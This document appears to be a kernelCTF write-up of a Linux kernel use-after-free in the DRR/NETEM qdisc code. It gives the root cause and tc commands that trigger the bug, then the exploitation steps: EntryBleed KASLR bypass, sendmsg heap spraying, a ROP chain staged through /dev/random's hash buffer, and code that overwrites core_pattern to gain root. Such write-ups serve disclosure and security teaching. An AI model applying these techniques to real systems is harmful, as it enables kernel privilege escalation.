## 1. Background

The Linux net/sched subsystem is responsible for network traffic control. It supports various types of **Qdisc**, each corresponding to a different network scheduling algorithm. For more fine-grained control, a Qdisc can create **classes** with different parameters, allowing multiple Qdisc instances to be combined into a tree-like hierarchy.

In our case, we first create a DRR Qdisc as the root node [1], and then add a class with specified parameters [2]. After that, we graft the default Qdisc of the DRR class to another type of Qdisc — NETEM (network emulation) [3] — and finally graft the default bound Qdisc of the NETEM Qdisc back to a DRR Qdisc [4].

``` bash
tc qdisc add dev lo root handle 1: drr # [1]
tc class add dev lo parent 1: classid 1:1 drr quantum 1500 # [2]
tc qdisc add dev lo parent 1:1 handle 2: netem delay 1ms limit 100 # [3]
tc qdisc add dev lo parent 2: drr # [4]
```

After these steps, the resulting Qdisc hierarchy is illustrated below:

```
---------------
| root        |
---------------
| DRR qdisc   |  (1:)
---------------
        |
        v
---------------
| DRR class   |  (1:1)
---------------
| NETEM qdisc |  (2:)
---------------
        |
        v  (private data)
---------------
| DRR qdisc   |
---------------
```

When receiving an incoming or outgoing packet, the enqueue handler of each layer's Qdisc decides whether to accept or drop the packet based on its scheduling algorithm. For example, the DRR Qdisc retains the packet as long as the lower layer also accepts it [5]. It then increments `sch->q.qlen` [6], which tracks the number of packets currently in the Qdisc's queue.

``` c
static int drr_enqueue(struct sk_buff *skb, struct Qdisc *sch,
               struct sk_buff **to_free)
{
    // [...]
    first = !cl->qdisc->q.qlen;
    err = qdisc_enqueue(skb, cl->qdisc, to_free);
    if (unlikely(err != NET_XMIT_SUCCESS)) { // [5]
        // [...]
        return err;
    }
    
    if (first) {
        list_add_tail(&cl->alist, &q->active);
        // [...]
    }

    // [...]
    sch->q.qlen++; // [6]
    return err;
}
```

The dequeue handler is responsible for transmitting packets. Similar to the enqueue handler, the Qdisc's scheduling algorithm and its parameters determine which packet should be sent. For example, the DRR Qdisc peeks at the first packet in the queue [7] and transmits it if the packet size is within the remaining quantum [8]. Note that upon successfully dequeuing a packet, `sch->q.qlen` is decremented accordingly [9].

``` c
static struct sk_buff *drr_dequeue(struct Qdisc *sch)
{
    // [...]
    while (1) {
        cl = list_first_entry(&q->active, struct drr_class, alist);
        skb = cl->qdisc->ops->peek(cl->qdisc); // [7]

        if (len <= cl->deficit) { // [8]
            cl->deficit -= len;
            skb = qdisc_dequeue_peeked(cl->qdisc);
            // [...]
            
            if (cl->qdisc->q.qlen == 0)
                list_del(&cl->alist);
            
            // [...]
            sch->q.qlen--; // [9]
            return skb;
        }
        // [...]
    }
    // [...]
}
```

The update of `sch->q.qlen` is important because some types of Qdisc maintain internal structures based on the number of enqueued packets. For example, the DRR enqueue handler (`drr_enqueue()`) adds a DRR class to the active list if the packet is the first one in its queue. Conversely, the DRR dequeue handler (`drr_dequeue()`) removes the class from the active list when it detects that the queue is empty.

Due to the tree-like hierarchy, the `q.qlen` of a Qdisc node equals the sum of the `q.qlen` values of all its child Qdisc nodes. In other words, a parent Qdisc counts all packets enqueued in its entire subtree.

The following diagram illustrates shows the `q.qlen` values at each level of the hierarchy:

```
        (q.qlen=5)
        -----------
        | qdisc A |
        -----------
        |         |
        v         v
(q.qlen=3)       (q.qlen=2)
-----------      -----------
| qdisc B |      | qdisc C |
-----------      -----------
[P] [P] [P]      |         |
                 v         v
         (q.qlen=1)        (q.qlen=1)
         -----------       -----------
         | qdisc D |       | qdisc E |
         -----------       -----------
         [P]               [P]
```

## 2. Root Cause Analysis

The NETEM Qdisc supports delayed transmission, meaning that outgoing packets are not sent immediately but are instead transmitted after a specified timeout. Users can configure the `"delay"` parameter using the `tc` tool to define how long packets should be delayed. This value is stored in the latency member [1] during initialization.

``` c
static int netem_change(struct Qdisc *sch, struct nlattr *opt,
            struct netlink_ext_ack *extack)
{
    struct netem_sched_data *q = qdisc_priv(sch);

    // [...]
    qopt = nla_data(opt);
    ret = parse_attr(tb, TCA_NETEM_MAX, opt, netem_policy, sizeof(*qopt));

    // [...]
    q->latency = PSCHED_TICKS2NS(qopt->latency); // [1]
    // [...]
}
```

When enqueuing a packet, the `netem_enqueue()` function calculates the transmission time and stores it in `cb->time_to_send`.

``` c
static int netem_enqueue(struct sk_buff *skb, struct Qdisc *sch,
             struct sk_buff **to_free)
{
    struct netem_skb_cb *cb;
    
    // [...]
    cb = netem_skb_cb(skb);
    if (...) {
        delay = tabledist(q->latency, q->jitter,
                  &q->delay_cor, &q->prng, q->delay_dist);

        now = ktime_get_ns();

        // [...]
        cb->time_to_send = now + delay; // [2]
        ++q->counter;
        tfifo_enqueue(skb, sch);
    }
}
```

The dequeue handler `netem_dequeue()` peeks at the first packet and compares the current time with the packet’s scheduled transmission time [3] to determine whether it should be sent. Once the delay has elapsed, the function enqueues the packet to the bound Qdisc [4].

The bound Qdisc may fail to enqueue the packet — for example, if it has reached its packet limit or cannot find a corresponding class. In such cases, the packet is manually dropped, and `qdisc_tree_reduce_backlog()` [5] is called to propagate the `q.qlen` update to the parent node and its ancestors. Ultimately, it decrements `sch->q.qlen` [6] to reflect the packet that has been dropped.

``` c
static struct sk_buff *netem_dequeue(struct Qdisc *sch)
{
    struct netem_sched_data *q = qdisc_priv(sch);
    
    // [...]
    skb = netem_peek(q);
    if (skb) {
        u64 time_to_send;
        u64 now = ktime_get_ns();

        // [...]
        time_to_send = netem_skb_cb(skb)->time_to_send;
        
        // [...]
        if (time_to_send <= now && q->slot.slot_next <= now) { // [3]
            
            // [...]
            if (q->qdisc) {
                unsigned int pkt_len = qdisc_pkt_len(skb);
                struct sk_buff *to_free = NULL;
                int err;

                err = qdisc_enqueue(skb, q->qdisc, &to_free); // [4]
                kfree_skb_list(to_free);
                if (err != NET_XMIT_SUCCESS) {
                    // [...]
                    qdisc_tree_reduce_backlog(sch, 1, pkt_len); // [5]
                    sch->qstats.backlog -= pkt_len;
                    sch->q.qlen--; // [6]
                }
                goto tfifo_dequeue;
            }
            sch->q.qlen--;
            goto deliver;
        }
    }
}
```

However, `qdisc_tree_reduce_backlog()` notifies the parent Qdisc to invoke `cops->qlen_notify()` [7] when it detects that the Qdisc has become empty [8].

If the `q.qlen` of a Qdisc is decremented after `qdisc_tree_reduce_backlog()` has been called, the parent Qdisc will not trigger `cops->qlen_notify()`, and thus its internal state will not be updated accordingly. This is, in fact, the fundamental cause of the vulnerability.

``` c
void qdisc_tree_reduce_backlog(struct Qdisc *sch, int n, int len)
{
    cops = sch->ops->cl_ops;
    while ((parentid = sch->parent)) {
        // [...]
        notify = !sch->q.qlen && /*...*/; // [8]

        sch = qdisc_lookup_rcu(qdisc_dev(sch), TC_H_MAJ(parentid));
        
        // [...]
        if (notify && cops->qlen_notify) {
            cl = cops->find(sch, parentid);
            cops->qlen_notify(sch, cl); // [7]
        }
        sch->q.qlen -= n;
        // [...]
    }
}
```

The `drr_qlen_notify()` function serves as the `cops->qlen_notify()` implementation for a DRR Qdisc class. It is called to unlink an empty DRR class from the active list [9].

``` c
static void drr_qlen_notify(struct Qdisc *csh, unsigned long arg)
{
    struct drr_class *cl = (struct drr_class *)arg;

    list_del(&cl->alist); // [9]
}
```

As a result, if this function is not called, a DRR class may **remain accessible from the active list** even after it has been destroyed and freed by `kfree()`, leading to a **use-after-free of `struct drr_class`**.

The class object can be deleted and destroyed using the following `tc` command, which is also utilized in our exploitation process:

``` bash
tc class del dev lo parent 1: classid 1:1 drr
```

## 3. Exploitation

### 3.1. Primitive

The DRR dequeue handler `drr_dequeue()` retrieves the first DRR class (`struct drr_class`) from the active list and invokes `cl->qdisc->ops->peek()` [2]. If an attacker can hijack the `peek` function pointer, this provides a powerful primitive to control the RIP.

``` c
static struct sk_buff *drr_dequeue(struct Qdisc *sch)
{
    struct drr_sched *q = qdisc_priv(sch);
    struct drr_class *cl;
    struct sk_buff *skb;
    unsigned int len;

    if (list_empty(&q->active))
        goto out;
    while (1) {
        cl = list_first_entry(&q->active, struct drr_class, alist); // [1]
        skb = cl->qdisc->ops->peek(cl->qdisc); // [2]
        // [...]
    }
    // [...]
}
```

Therefore, the exploitation strategy is clear: redirect `cl->qdisc->ops->peek` to point to controlled data in order to achieve an arbitrary call.

## 3.2. Bypass KASLR

The vulnerability primitive does not provide a way to leak kernel addresses. To address this, we use EntryBleed, a time-based side-channel attack, to leak the kernel base address. More details can be found at https://www.willsroot.io/2022/12/entrybleed.html or other kernelCTF submissions.

## 3.3. Reclaim UAF Object

Instead of reclaiming `cl` (`struct drr_class`) from the `kmalloc-128` slab, we chose to reclaim `cl->qdisc` (`struct Qdisc`) from the `kmalloc-1k` slab for three reasons:

1. If we attempt to reclaim `cl`, we must set `cl->qdisc` to point to a memory region containing our crafted fake Qdisc object. This fake object must also have its `->ops` field pointing to another controlled memory region containing function pointers. This setup is nearly impossible without a kernel heap leak. Even if we could side-channel the kernel heap layout, predicting the exact location of fully controlled memory regions remains infeasible.
2. After `cl` is freed, the memory chunk is not zeroed out, so most of its contents remain unchanged. This means we only need to hijack a secondary object (`cl->qdisc`), simplifying the exploitation process and improving its stability.
3. Even if we successfully hijack RIP, we still need to execute a ROP chain or another technique to escalate privileges. Since `cl->qdisc` is passed as the first argument (RDI) to `cl->qdisc->ops->peek()`, we can pivot the stack to RDI, whose content is fully under our control.

The second reason is also particularly crucial when reclaiming `cl->qdisc`.

The `SYS_sendmsg` system call is a widely known technique for spraying the `kmalloc` slab, but it requires a valid `struct cmsghdr` at the beginning of the payload. However, in our case, the beginning of the payload must contain the first ROP gadget, which makes the header invalid and breaks the expected structure. As a result, we cannot directly use `SYS_sendmsg` to spray a ROP chain as the payload when attempting to reclaim the freed `cl->qdisc`.

To overcome this limitation, we first sprayed dummy objects to drain all partially filled slabs, ensuring that subsequent allocations would land in an active slab. Once `cl->qdisc` was freed, its address was placed at the head of the freelist, making it reclaimable on the next allocation. We then invoked `SYS_sendmsg` with a ROP chain as the payload. Although the message is immediately discarded due to the invalid header, the ROP chain remains in the reclaimed memory, successfully overwriting the freed `cl->qdisc` object.

At this point, the relationship between the objects is as follows:

```
---------------
| active list |
---------------
       |
       v
    ---------------  (qdisc)  ---------------
    | cl (freed)  |  -------> | 0x414141... |
    ---------------           | 0x414141... |
                              | ...         |
                              ---------------
```

## 3.4. Control RIP

We now have full control over `cl->qdisc`, but what value should the `->ops` field hold in order to control `cl->qdisc->ops->peek` without leaking a kernel heap address?

Upon investigation, we discovered that the contents of the kernel variable `&input_pool.hash.buf` can be controlled by writing data to `/dev/random` or `/dev/urandom`. For further details, please refer to [novel techniques](./novel-techniques.md).

```
---------------
| active list |
---------------
       |
       v                                             (input_pool.hash.buf)
    ---------------  (qdisc)  ---------------          ---------------   -
    | cl (freed)  |  -------> | 0x414141... |          | 0x424242... |    |
    ---------------           | ops         | -------> | 0x424242... |     | - 0x40
                              | ...         |          | ...         |    |
                              ---------------          ---------------   -
```

We simply set `->ops` to the kernel variable `&input_pool.hash.buf` and fill the hash buffer with stack-pivoting gadgets to control `->ops->peek`. When `cl->qdisc->ops->peek()` is invoked, execution pivots the kernel stack to the value in RDI, which points to `cl->qdisc` — an object fully under our control.

```
---------------
| active list |
---------------
       |
       v                                             (input_pool.hash.buf)
    ---------------  (qdisc)  ----------------          --------------------
    | cl (freed)  |  -------> | rop_gadget_1 |          | rop_xchg_rdi_rsp |
    ---------------           | ops          | -------> | rop_xchg_rdi_rsp |
                              | rop_gadget_2 |          | ...              |
                              ----------------          --------------------
```

We overwrite the kernel variable `core_pattern[]` using our ROP chain, which performs two function calls:
1. `_copy_from_user(&core_pattern, "|/proc/%P/fd/666", 0x30)` - overwrites `core_pattern[]` with user-controlled data.
2. `msleep(0x10000000)` - prevents the corrupted kernel stack from triggering a kernel panic by putting the task to sleep.

## 3.5. Get The Flag

During the initialization phase, a `core_pattern` monitoring process is launched to detect whether the exploitation has succeeded.

``` c
int main(int argc, char *argv[])
{
    // [...]
    /**
     * Create a child process to monitor core_pattern. If the core_pattern is
     * overwritten due to the vulnerability, it immediately triggers a segfault.
     */
    if (fork() == 0) {
        setup_core_pattern_monitor();
    }
    // [...]
}
```

This monitoring process duplicates the current exploitation binary into a memfd (file descriptor 666), and continuously polls the contents of `/proc/sys/kernel/core_pattern`. Once a modification is detected, the process crashes via a null dereference to trigger the core dump.

``` c
void setup_core_pattern_monitor()
{
    pin_on_cpu(1);
    setsid();

    int memfd = memfd_create("", 0);
    char buf[0x100] = {};

    // Duplicate the exploit binary to memfd 666.
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    // Poll the core_pattern content and trigger segfault if it is modified.
    while (1) {
        int corefd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(corefd, buf, sizeof(buf));
        close(corefd);
        if (strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0)
            break;
        sleep(1);
    }
    *(unsigned long *)0 = 0;
}
```

After we perform kernel ROP to overwrite the `core_pattern` to execute the memfd binary, the kernel will run the binary located at `/proc/<pid>/fd/666` when a core dump occurs.

When the memfd binary is executed via the `core_pattern` with root privileges, it receives the crashing process's PID as its second argument. The memfd handler then uses `pidfd_getfd()` to duplicate the crashing process's stdout, prints the flag, and shuts down the machine.

``` c
int main(int argc, char *argv[])
{
    // [...]
    /**
     * When the exploit succeeds, the core_pattern monitor will trigger a segfault
     * and execute the memfile as root, passing the PID as an argument.
     */
    if (argc > 1) {
        int pid = strtoull(argv[1], 0, 10);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        dup2(stdoutfd, 1);
        
        system("cat /flag;echo o>/proc/sysrq-trigger");
        execlp("bash", "bash", NULL);
    }
    // [...]
}
```
